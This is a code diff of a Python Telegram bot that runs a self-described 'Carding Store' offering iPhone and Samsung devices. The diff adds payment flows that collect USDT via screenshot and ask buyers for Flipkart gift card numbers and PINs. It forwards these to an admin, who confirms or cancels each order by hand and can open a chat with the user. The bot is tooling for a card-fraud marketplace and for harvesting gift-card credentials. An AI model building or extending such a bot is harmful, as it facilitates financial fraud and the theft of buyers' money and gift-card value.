@@ -52,7 +52,7 @@ def start(msg):
 
     kb = InlineKeyboardMarkup()
     kb.add(InlineKeyboardButton("💳 BUY", callback_data="buy"))
-    bot.send_message(msg.chat.id, "👋 Welcome to Carding Store\n👉 iPhone / Samsung Devices Buy Here", reply_markup=kb)
+    bot.send_message(msg.chat.id, "👋 Welcome to Atomatic Carding Store\n👉 iPhone / Samsung Devices Buy Here", reply_markup=kb)
 
 # -----------------------
 # CALLBACK HANDLER
@@ -83,7 +83,7 @@ def callback(call):
             bot.edit_message_text("Choose your device:", call.message.chat.id, call.message.message_id, reply_markup=kb)
             return
         elif data == "platform_coming":
-            bot.edit_message_text("🚧 This feature is coming soon…... please restart the bot /start ", call.message.chat.id, call.message.message_id)
+            bot.edit_message_text("🚧 This feature is coming soon…... please re start the bot /start ", call.message.chat.id, call.message.message_id)
             return
 
     if data.startswith("buy_") and user_stage.get(user_id) == "service":
@@ -157,8 +157,70 @@ def callback(call):
         )
         return
 
+    # PAYMENT CALLBACKS
+    if data == "pay_usdt" and user_stage.get(user_id) == "choose_payment":
+        user_stage[user_id] = "waiting_payment"
+        pending_messages.setdefault(user_id, {})['payment_type'] = "USDT"
+        bot.send_message(
+            user_id,
+            f"💰 Send USDT (TRC20) to this address :\n\n{USDT_ADDRESS}\n\n"
+            "After payment, send the screenshot of your transaction.... for verification..."
+        )
+        return
+
+    if data == "pay_flipkart" and user_stage.get(user_id) == "choose_payment":
+        user_stage[user_id] = "flipkart_card"
+        pending_messages.setdefault(user_id, {})['payment_type'] = "Flipkart Gift Card"
+        bot.send_message(user_id, "🎁 Enter your Flipkart Gift Card number:")
+        return
+
+    # ---- ADMIN ACTIONS (chat/confirm/cancel/endchat) ----
+    if data.startswith(("confirm","cancel","chat","endchat")):
+        parts = data.split("|")
+        action = parts[0]
+        if len(parts) < 2:
+            bot.answer_callback_query(call.id, "Invalid admin action.")
+            return
+        try:
+            target_id = int(parts[1])
+        except:
+            bot.answer_callback_query(call.id, "Invalid user id.")
+            return
+
+        # --- CHAT / ENDCHAT LOGIC ---
+        if action == "chat":
+            active_chats[target_id] = True
+            kb = InlineKeyboardMarkup()
+            kb.add(InlineKeyboardButton("🛑 End this Chat", callback_data=f"endchat|{target_id}"))
+            bot.send_message(target_id, "💬 Bot is connected with you.")
+            bot.send_message(ADMIN_ID, f"💬 Chat started with user {target_id}", reply_markup=kb)
+            return
+
+        if action == "endchat":
+            bot.send_message(ADMIN_ID, f"💬 Type the final message to send to user {target_id} before ending chat:")
+            bot.register_next_step_handler_by_chat_id(ADMIN_ID, lambda m: finish_chat(m, target_id))
+            return
+
+        if target_id not in pending_messages:
+            bot.send_message(ADMIN_ID, "⚠️ No pending request from this user.")
+            return
+
+        info = pending_messages.pop(target_id)
+        service = info.get('service', 'Service')
+
+        if action == "confirm":
+            bot.send_message(target_id, f"✅ Your payment is successful! please wait 5-10 minutes your oder placed soon. {service}...")
+            kb = InlineKeyboardMarkup()
+            kb.add(InlineKeyboardButton("💬 Chat with User", callback_data=f"chat|{target_id}"))
+            bot.send_message(ADMIN_ID, f"Payment confirmed for user {target_id}.", reply_markup=kb)
+        else:
+            bot.send_message(target_id, "❌ Your payment not received and your order is cancelled.")
+            bot.send_message(ADMIN_ID, f"❌ Payment cancelled for user {target_id}.")
+        user_stage[target_id] = "done"
+        return
+
 # -----------------------
-# HANDLE NAME, MOBILE & ADDRESS (OLD STYLE)
+# HANDLE NAME, MOBILE & ADDRESS
 # -----------------------
 @bot.message_handler(func=lambda m: user_stage.get(m.from_user.id) in ["ask_name", "ask_mobile", "ask_address"], content_types=['text'])
 def handle_user_input(msg):
@@ -182,7 +244,7 @@ def handle_user_input(msg):
             return
         pending_messages.setdefault(user_id, {})['mobile'] = mobile
         user_stage[user_id] = "ask_address"
-        bot.send_message(user_id, "🏠 Please enter your Address (State → City → Street → Pin Code):")
+        bot.send_message(user_id, "🏠 Please enter your Address like - state , city , village , pincode:")
         return
 
     if stage == "ask_address":
@@ -201,7 +263,122 @@ def handle_user_input(msg):
         return
 
 # -----------------------
-# BROADCAST COMMAND (ADMIN ONLY)
+# FINISH CHAT FUNCTION
+# -----------------------
+def finish_chat(msg, target_id):
+    final_text = msg.text.strip()
+    if target_id in active_chats and active_chats[target_id]:
+        bot.send_message(target_id, final_text)
+        active_chats.pop(target_id, None)
+        bot.send_message(ADMIN_ID, f"💬 Chat with user {target_id} ended.")
+    else:
+        bot.send_message(ADMIN_ID, f"⚠️ No active chat with user {target_id}.")
+
+# -----------------------
+# MESSAGE HANDLER (PAYMENT SCREENSHOT / FLIPKART)
+# -----------------------
+@bot.message_handler(func=lambda m: True, content_types=['text','photo'])
+def chat_handler(msg):
+    user_id = msg.from_user.id
+    stage = user_stage.get(user_id, "none")
+    pending_messages.setdefault(user_id, {})
+
+    if user_id == ADMIN_ID:
+        for uid, active in active_chats.items():
+            if active:
+                bot.send_message(uid, f"🤖Bot: {msg.text if msg.content_type=='text' else '📸 Screenshot sent'}")
+        return
+
+    if user_id in active_chats and active_chats[user_id]:
+        bot.send_message(ADMIN_ID, f"💬 User {user_id}: {msg.text if msg.content_type=='text' else '📸 Screenshot sent'}")
+        return
+
+    # --- FLIPKART PAYMENT ---
+    if stage == "flipkart_card":
+        text = msg.text.strip()
+        tokens = [t for t in text.replace("\n", " ").split(" ") if t]
+        if len(tokens) >= 2:
+            pending_messages[user_id]['flipkart_card'] = tokens[0]
+            pending_messages[user_id]['flipkart_pin'] = tokens[1]
+        else:
+            pending_messages[user_id]['flipkart_card'] = tokens[0]
+            user_stage[user_id] = "flipkart_pin"
+            bot.send_message(user_id, "🎁 Now enter your Flipkart Gift Card PIN:")
+            return
+
+        user_stage[user_id] = "done"
+        bot.send_message(user_id, "🔄 Flipkart Gift Card details received. and checking your flipkart card.... please wait 4-5 secon...")
+        admin_text = (
+            f"💰 Flipkart Payment Request\n"
+            f"Name: <a href='tg://user?id={user_id}'>{msg.from_user.first_name}</a>\n"
+            f"User ID: {user_id}\n"
+            f"Service: {pending_messages[user_id].get('service','Service')}\n"
+            f"Payment Method: Flipkart Gift Card\n\n"
+            f"Card Number: {pending_messages[user_id]['flipkart_card']}\n"
+            f"PIN: {pending_messages[user_id].get('flipkart_pin','')}"
+        )
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
+               InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}"))
+        bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=kb)
+        return
+
+    if stage == "flipkart_pin":
+        pending_messages[user_id]['flipkart_pin'] = msg.text.strip()
+        user_stage[user_id] = "done"
+        bot.send_message(user_id, "🔄 Flipkart Gift Card details received. and checking your flipkart card.... please wait 4-5 secon....")
+        admin_text = (
+            f"💰 Flipkart Payment Request\n"
+            f"Name: <a href='tg://user?id={user_id}'>{msg.from_user.first_name}</a>\n"
+            f"User ID: {user_id}\n"
+            f"Service: {pending_messages[user_id].get('service','Service')}\n"
+            f"Payment Method: Flipkart Gift Card\n\n"
+            f"Card Number: {pending_messages[user_id]['flipkart_card']}\n"
+            f"PIN: {pending_messages[user_id]['flipkart_pin']}"
+        )
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
+               InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}"))
+        bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=kb)
+        return
+
+    # --- USDT PAYMENT ---
+    if stage == "waiting_payment":
+        payment_type = pending_messages[user_id].get('payment_type', '')
+        if payment_type == "USDT":
+            if msg.content_type != 'photo':
+                bot.send_message(user_id, "⚠️ Please send the screenshot (photo) of your USDT transfer as payment proof.")
+                return
+            pending_messages[user_id]['screenshot'] = msg.photo[-1].file_id
+            user_stage[user_id] = "done"
+            bot.send_message(user_id, "🔄 Payment screenshot received. and transfering our server for verification please wait 4-5 seconds..")
+            admin_text = (
+                f"💰 USDT Payment Request\n"
+                f"Name: <a href='tg://user?id={user_id}'>{msg.from_user.first_name}</a>\n"
+                f"User ID: {user_id}\n"
+                f"Service: {pending_messages[user_id].get('service','Service')}\n"
+                f"Payment Method: USDT (TRC20)\n"
+                f"USDT Address: {USDT_ADDRESS}\n"
+            )
+            kb = InlineKeyboardMarkup()
+            kb.add(
+                InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
+                InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}")
+            )
+            bot.send_photo(
+                ADMIN_ID,
+                pending_messages[user_id]['screenshot'],
+                caption=admin_text,
+                parse_mode="HTML",
+                reply_markup=kb
+            )
+            return
+
+    # DEFAULT RESPONSE
+    bot.send_message(user_id, "⚠️ Please follow the steps or use /start to begin.")
+
+# -----------------------
+# BROADCAST
 # -----------------------
 @bot.message_handler(commands=['broadcast'])
 def broadcast(msg):
@@ -221,19 +398,7 @@ def broadcast(msg):
     bot.reply_to(msg, f"✅ Broadcast sent to {sent} users.")
 
 # -----------------------
-# FINISH CHAT FUNCTION (OLD CODE STYLE)
-# -----------------------
-def finish_chat(msg, target_id):
-    final_text = msg.text.strip()
-    if target_id in active_chats and active_chats[target_id]:
-        bot.send_message(target_id, final_text)
-        active_chats.pop(target_id, None)
-        bot.send_message(ADMIN_ID, f"💬 Chat with user {target_id} ended.")
-    else:
-        bot.send_message(ADMIN_ID, f"⚠️ No active chat with user {target_id}.")
-
-# -----------------------
-# RUN BOT (OLD CODE STYLE)
+# RUN BOT
 # -----------------------
 print("✅ Bot running…")
 bot.infinity_polling()
